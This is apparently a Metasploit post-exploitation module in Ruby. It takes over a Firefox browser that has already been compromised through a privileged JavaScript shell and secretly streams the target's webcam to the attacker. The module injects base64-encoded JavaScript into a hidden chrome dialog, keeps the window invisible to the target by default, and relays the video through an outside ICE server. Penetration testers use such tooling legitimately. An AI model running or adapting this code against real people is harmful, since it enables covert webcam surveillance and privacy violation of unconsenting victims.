##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'json'

class MetasploitModule < Msf::Post
  include Msf::Exploit::Remote::FirefoxPrivilegeEscalation
  include Msf::Post::WebRTC

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Firefox Webcam Chat on Privileged Javascript Shell',
      'Description'   => %q{
        This module allows streaming a webcam from a privileged Firefox Javascript shell.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'joev' ],
      'References'    => [
        [ 'URL', 'http://www.rapid7.com/db/modules/exploit/firefox/local/exec_shellcode' ]
      ],
      'DisclosureDate' => 'May 13 2014'
    ))

    register_options([
      OptBool.new('CLOSE', [false, "Forcibly close previous chat session", false]),
      OptBool.new('VISIBLE', [false, "Show a window containing the chat to the target", false]),
      OptInt.new('TIMEOUT', [false, "End the chat session after this many seconds", -1]),
      OptString.new('ICESERVER', [true, "The ICE server that sets up the P2P connection", 'wsnodejs.jit.su:80'])
    ])
  end

  def run
    unless os_check
      print_error "Windows versions of Firefox are not supported at this time [RM #8810]."
      return
    end

    server     = datastore['ICESERVER']
    offerer_id = Rex::Text.rand_text_alphanumeric(10)
    channel    = Rex::Text.rand_text_alphanumeric(20)

    result = js_exec(js_payload(server, offerer_id, channel))

    if datastore['CLOSE']
      print_status "Stream closed."
    else
      if result.present?
        print_status result
        connect_video_chat(server, channel, offerer_id)
      else
        print_warning "No response received"
      end
    end
  end

  def os_check
    user_agent = js_exec(%Q|
      return Components.classes["@mozilla.org/network/protocol;1?name=http"]
        .getService(Components.interfaces.nsIHttpProtocolHandler).userAgent;
    |)
    user_agent !~ /windows/i
  end

  def js_payload(server, offerer_id, channel)
    interface = load_interface('offerer.html')
    api       = load_api_code

    interface.gsub!(/\=SERVER\=/, server)
    interface.gsub!(/\=CHANNEL\=/, channel)
    interface.gsub!(/\=OFFERERID\=/, offerer_id)

    if datastore['TIMEOUT'] > 0
      api << "; setTimeout(function(){window.location='about:blank'}, #{datastore['TIMEOUT']*1000}); "
    end

    url = if datastore['CLOSE']
      '"about:blank"'
    else
      '"data:text/html;base64,"+html'
    end

    name = if datastore['VISIBLE']
      Rex::Text.rand_text_alphanumeric(10)
    else
      '_self'
    end

    %Q|
      (function(send){
        try {

          var AppShellService = Components
             .classes["@mozilla.org/appshell/appShellService;1"]
             .getService(Components.interfaces.nsIAppShellService);

          var html = "#{Rex::Text.encode_base64(interface)}";
          var url = #{url};
          AppShellService.hiddenDOMWindow.openDialog(url, '#{name}', 'chrome=1,width=1100,height=600');
          send("Streaming webcam...");

        } catch (e) {
          send(e);
        }
      })(this.send);
    |
  end
end
